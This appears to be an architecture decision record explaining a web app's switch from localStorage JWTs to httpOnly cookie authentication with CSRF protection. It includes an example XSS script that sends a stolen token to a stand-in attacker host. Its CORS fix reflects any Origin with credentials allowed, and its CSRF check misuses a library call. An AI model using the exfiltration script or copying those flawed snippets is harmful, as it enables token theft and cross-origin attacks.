# ADR-003: httpOnly Cookie Authentication

**Date**: December 19, 2025
**Status**: Accepted
**Security Level**: CRITICAL
**Related**: P0-SEC-2 (XSS Vulnerability Fix)

---

## Context

Prior to December 2025, the Optio platform used localStorage to store JWT access tokens:

```javascript
// OLD (VULNERABLE)
localStorage.setItem('token', response.data.access_token)
api.defaults.headers.common['Authorization'] = `Bearer ${token}`
```

### The Problem

**localStorage is vulnerable to XSS attacks**:

1. **JavaScript access** - Any JavaScript code can read localStorage
2. **XSS injection** - Malicious scripts can steal tokens
3. **No expiration** - Tokens persist until manually cleared
4. **No same-site protection** - Vulnerable to CSRF attacks

**Real-world impact**:
- If attacker injects `<script>` tag via evidence upload or quest description
- Script can read `localStorage.getItem('token')`
- Token sent to attacker's server
- Attacker impersonates user indefinitely

**CVSS Score**: 8.1 (High) - Authentication bypass via XSS

---

## Decision

We adopt **httpOnly cookies** for all authentication tokens with the following security controls:

### Rule 1: httpOnly Cookies ONLY

**All authentication tokens MUST be stored in httpOnly cookies.**

```python
# Backend (Flask)
from flask import make_response, jsonify

@app.route('/api/auth/login', methods=['POST'])
def login():
    # Authenticate user
    access_token = create_access_token(user_id)
    refresh_token = create_refresh_token(user_id)

    response = make_response(jsonify({'success': True}))

    # Set httpOnly cookies (NOT accessible to JavaScript)
    response.set_cookie(
        'access_token',
        access_token,
        httponly=True,      # Prevents JavaScript access
        secure=True,        # HTTPS only
        samesite='Lax',     # CSRF protection
        max_age=3600        # 1 hour
    )

    response.set_cookie(
        'refresh_token',
        refresh_token,
        httponly=True,
        secure=True,
        samesite='Lax',
        max_age=2592000     # 30 days
    )

    return response
```

**Why**: httpOnly flag prevents JavaScript from accessing cookies, eliminating XSS token theft.

---

### Rule 2: No Tokens in Response Bodies

**Authentication endpoints MUST NOT return tokens in JSON response.**

```python
# ❌ WRONG - Token in response body (XSS vulnerable)
return jsonify({
    'success': True,
    'access_token': access_token,  # ❌ Never do this
    'refresh_token': refresh_token # ❌ Never do this
})

# ✅ CORRECT - Tokens in httpOnly cookies only
response = make_response(jsonify({'success': True}))
response.set_cookie('access_token', access_token, httponly=True, ...)
return response
```

**Why**: If tokens are in response body, frontend might store them in localStorage.

---

### Rule 3: CSRF Protection Required

**All state-changing operations (POST/PUT/DELETE) require CSRF token.**

```python
# Backend CSRF middleware
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# Frontend gets CSRF token
response = make_response(jsonify({'success': True}))
response.set_cookie('csrf_token', generate_csrf(), httponly=False)  # Readable by JS
```

```javascript
// Frontend sends CSRF token in header
api.post('/api/tasks/123/complete', {}, {
    headers: {
        'X-CSRF-Token': getCookie('csrf_token')
    }
})
```

**Why**: httpOnly cookies are sent automatically, making the app vulnerable to CSRF without additional protection.

---

### Rule 4: Automatic Cookie Rotation

**Refresh token endpoint MUST rotate both access and refresh tokens.**

```python
@app.route('/api/auth/refresh', methods=['POST'])
def refresh():
    # Get refresh token from httpOnly cookie
    refresh_token = request.cookies.get('refresh_token')

    if not refresh_token or not verify_refresh_token(refresh_token):
        return jsonify({'error': 'Invalid refresh token'}), 401

    user_id = decode_token(refresh_token)['sub']

    # Generate NEW tokens (rotation)
    new_access_token = create_access_token(user_id)
    new_refresh_token = create_refresh_token(user_id)

    response = make_response(jsonify({'success': True}))

    # Set NEW httpOnly cookies
    response.set_cookie('access_token', new_access_token, httponly=True, ...)
    response.set_cookie('refresh_token', new_refresh_token, httponly=True, ...)

    return response
```

**Why**: Token rotation limits the window of vulnerability if a token is compromised.

---

### Rule 5: Secure Logout

**Logout MUST clear all httpOnly cookies server-side.**

```python
@app.route('/api/auth/logout', methods=['POST'])
def logout():
    response = make_response(jsonify({'success': True}))

    # Clear cookies (set to expired)
    response.set_cookie('access_token', '', expires=0)
    response.set_cookie('refresh_token', '', expires=0)
    response.set_cookie('csrf_token', '', expires=0)

    return response
```

```javascript
// Frontend clears any client-side state
api.post('/api/auth/logout').then(() => {
    // Clear user context
    setUser(null)
    // Cookies are cleared by server
})
```

**Why**: Ensures tokens are invalidated on both server and client.

---

## Cookie Configuration

### Production Settings

```python
# backend/config.py
COOKIE_CONFIG = {
    'httponly': True,           # Prevents JavaScript access
    'secure': True,             # HTTPS only
    'samesite': 'Lax',          # CSRF protection (relaxed for OAuth)
    'domain': '.optioeducation.com',  # Subdomain support
    'path': '/'                 # Available across all routes
}

ACCESS_TOKEN_EXPIRES = timedelta(hours=1)
REFRESH_TOKEN_EXPIRES = timedelta(days=30)
```

### Development Settings

```python
# backend/config.py (development)
COOKIE_CONFIG = {
    'httponly': True,
    'secure': False,            # Allow HTTP in development
    'samesite': 'Lax',
    'domain': 'localhost',
    'path': '/'
}
```

**Note**: `secure=False` ONLY in development. Production MUST use `secure=True`.

---

## Frontend Integration

### Axios Configuration

```javascript
// frontend/src/services/api.js
import axios from 'axios'

const api = axios.create({
    baseURL: import.meta.env.VITE_API_URL,
    withCredentials: true  // CRITICAL: Send cookies with requests
})

// No token management needed - cookies sent automatically
```

**CRITICAL**: `withCredentials: true` is required for cookies to be sent with cross-origin requests.

### Authentication Flow

```javascript
// Login
async function login(email, password) {
    // Cookies set automatically by server
    const response = await api.post('/api/auth/login', { email, password })

    // No token storage needed
    return response.data
}

// Authenticated requests
async function getMyTasks() {
    // Cookies sent automatically
    const response = await api.get('/api/tasks')
    return response.data
}

// Logout
async function logout() {
    // Server clears cookies
    await api.post('/api/auth/logout')
}
```

**No localStorage, no sessionStorage, no manual token management.**

---

## Security Comparison

### Before (localStorage)

```javascript
// ❌ VULNERABLE
localStorage.setItem('token', token)

// XSS attack
<script>
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: localStorage.getItem('token')
    })
</script>
```

**Vulnerabilities**:
- XSS can steal token
- Token persists indefinitely
- No CSRF protection
- Manual token refresh

### After (httpOnly cookies)

```python
# ✅ SECURE
response.set_cookie('access_token', token, httponly=True, secure=True, samesite='Lax')
```

```javascript
// XSS attack (fails)
<script>
    document.cookie  // Returns empty string (httpOnly blocks access)
</script>
```

**Security improvements**:
- XSS cannot access cookies
- Automatic expiration
- CSRF protection via samesite
- Automatic token refresh

---

## Migration (Completed December 2025)

### Phase 1: Backend Changes ✅

1. Updated `/api/auth/login` to set httpOnly cookies
2. Updated `/api/auth/refresh` to rotate httpOnly cookies
3. Updated `/api/auth/logout` to clear cookies
4. Removed tokens from response bodies
5. Added CSRF protection middleware

### Phase 2: Frontend Changes ✅

1. Removed all localStorage token references
2. Added `withCredentials: true` to Axios config
3. Removed Authorization header management
4. Removed manual token refresh logic
5. Updated AuthContext to work without tokens

### Phase 3: Testing ✅

1. Verified login sets cookies
2. Verified authenticated requests work
3. Verified refresh token rotation
4. Verified logout clears cookies
5. Verified XSS cannot access tokens

---

## CSRF Protection Details

### CSRF Token Flow

1. **Server generates CSRF token** on login/registration
2. **Server sets csrf_token cookie** (httponly=FALSE, so JS can read)
3. **Frontend reads cookie** and includes in header
4. **Server validates** X-CSRF-Token header matches cookie

```python
# Backend CSRF validation
from flask_wtf.csrf import CSRFProtect, generate_csrf, validate_csrf

csrf = CSRFProtect(app)

@app.route('/api/auth/login', methods=['POST'])
def login():
    # ... authenticate user ...

    response = make_response(jsonify({'success': True}))
    response.set_cookie('access_token', access_token, httponly=True, ...)
    response.set_cookie('csrf_token', generate_csrf(), httponly=False)  # JS readable
    return response

@app.route('/api/tasks/<task_id>/complete', methods=['POST'])
@csrf.exempt  # Manually validate
def complete_task(task_id):
    csrf_token = request.headers.get('X-CSRF-Token')
    if not validate_csrf(csrf_token):
        return jsonify({'error': 'Invalid CSRF token'}), 403
    # ... complete task ...
```

```javascript
// Frontend CSRF helper
function getCsrfToken() {
    return document.cookie
        .split('; ')
        .find(row => row.startsWith('csrf_token='))
        ?.split('=')[1]
}

// Include in POST requests
api.post('/api/tasks/123/complete', {}, {
    headers: {
        'X-CSRF-Token': getCsrfToken()
    }
})
```

---

## Edge Cases & Troubleshooting

### Issue 1: Cookies not sent with requests

**Symptoms**: 401 Unauthorized errors despite being logged in

**Causes**:
- Missing `withCredentials: true` in Axios config
- CORS headers not allowing credentials
- Cookie domain mismatch

**Fix**:
```javascript
// Frontend
axios.create({
    withCredentials: true  // ← Add this
})

// Backend
@app.after_request
def after_request(response):
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
    return response
```

### Issue 2: Cookies cleared on redirect

**Symptoms**: User logged out after OAuth redirect

**Cause**: SameSite=Strict blocks cross-site cookies

**Fix**: Use `SameSite=Lax` (allows top-level navigation)
```python
response.set_cookie('access_token', token, samesite='Lax')  # Not 'Strict'
```

### Issue 3: Development HTTP not working

**Symptoms**: Cookies not set in development (localhost)

**Cause**: `secure=True` requires HTTPS

**Fix**: Use `secure=False` in development only
```python
secure = app.config['ENV'] == 'production'
response.set_cookie('access_token', token, secure=secure)
```

---

## Compliance & Standards

### OWASP Compliance

✅ **A7:2017 - Cross-Site Scripting (XSS)**
- httpOnly prevents token theft via XSS

✅ **A2:2017 - Broken Authentication**
- Secure token storage
- Automatic expiration
- Token rotation

✅ **A5:2017 - Broken Access Control**
- CSRF protection
- SameSite protection

### Security Headers

```python
@app.after_request
def security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

---

## Consequences

### Positive

1. **XSS protection** - Tokens cannot be stolen via JavaScript
2. **Simpler frontend** - No token management logic needed
3. **Automatic expiration** - Tokens expire via max_age
4. **CSRF protection** - SameSite attribute prevents attacks
5. **Secure by default** - httpOnly + secure flags

### Negative

1. **CORS complexity** - Requires `withCredentials` and CORS headers
2. **Mobile apps** - May require different auth strategy
3. **Third-party API** - External apps can't use cookie auth
4. **Debugging** - Cookies not visible in browser DevTools Application tab

### Neutral

1. **No localStorage** - Cleaner separation of concerns
2. **Server-side sessions** - Could add session management in future
3. **Token refresh** - Requires endpoint but is automatic

---

## Future Enhancements

### 1. Fingerprinting (Planned)

Add device fingerprinting to detect token theft:

```python
def create_access_token(user_id):
    fingerprint = hash(user_agent + ip_address + accept_language)
    token = jwt.encode({'sub': user_id, 'fp': fingerprint}, secret)
    return token

def verify_access_token(token):
    payload = jwt.decode(token, secret)
    current_fingerprint = hash(user_agent + ip_address + accept_language)
    if payload['fp'] != current_fingerprint:
        raise InvalidTokenError('Device fingerprint mismatch')
    return payload
```

### 2. Session Management (Future)

Move to server-side sessions with Redis:

```python
# Store session in Redis
session_id = generate_session_id()
redis.set(f'session:{session_id}', user_id, ex=3600)

# Set session cookie
response.set_cookie('session_id', session_id, httponly=True, ...)
```

### 3. Multi-factor Authentication (Future)

Add MFA requirement for sensitive operations:

```python
@require_mfa
def delete_account():
    # Requires recent MFA verification
    pass
```

---

## Related ADRs

- [ADR-001: Repository Pattern Migration](001-repository-pattern-migration.md)
- [ADR-002: Database Client Usage](002-database-client-usage.md)
- [ADR-004: Safari/iOS Compatibility](004-safari-ios-compatibility.md)

---

## References

- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- OWASP CSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- MDN httpOnly: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies
- Original security audit: `COMPREHENSIVE_CODEBASE_REVIEW.md` (P0-SEC-2)

---

**Last Updated**: December 19, 2025
**Author**: Development Team
**Status**: Accepted and Enforced
**Security Review**: Required for any changes
